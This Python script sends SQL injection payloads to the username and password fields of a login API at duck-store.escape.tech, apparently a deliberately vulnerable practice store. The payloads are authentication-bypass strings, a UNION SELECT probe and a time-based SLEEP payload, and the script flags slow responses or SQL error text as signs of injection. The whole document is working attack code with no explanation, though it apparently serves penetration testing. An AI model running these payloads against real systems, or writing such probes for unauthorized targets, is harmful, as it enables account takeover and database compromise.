import requests
import time

# Test login endpoint for SQL injection
url = "https://duck-store.escape.tech/api/v1/auth/login"

# Test basic SQL injection in username/password
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' /*",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
]

for payload in payloads:
    data = {"username": payload, "password": "test"}
    start = time.time()
    resp = requests.post(url, json=data)
    elapsed = time.time() - start
    print(f"Payload: {payload[:30]}... Status: {resp.status_code}, Time: {elapsed:.2f}s, Len: {len(resp.text)}")
    if elapsed > 4:
        print(f"  *** TIME-BASED SQLi DETECTED ***")
    if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
        print(f"  *** SQL ERROR DETECTED ***")

print("\n--- Testing password parameter ---")
for payload in payloads:
    data = {"username": "test", "password": payload}
    start = time.time()
    resp = requests.post(url, json=data)
    elapsed = time.time() - start
    print(f"Payload: {payload[:30]}... Status: {resp.status_code}, Time: {elapsed:.2f}s, Len: {len(resp.text)}")
    if elapsed > 4:
        print(f"  *** TIME-BASED SQLi DETECTED ***")
    if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
        print(f"  *** SQL ERROR DETECTED ***")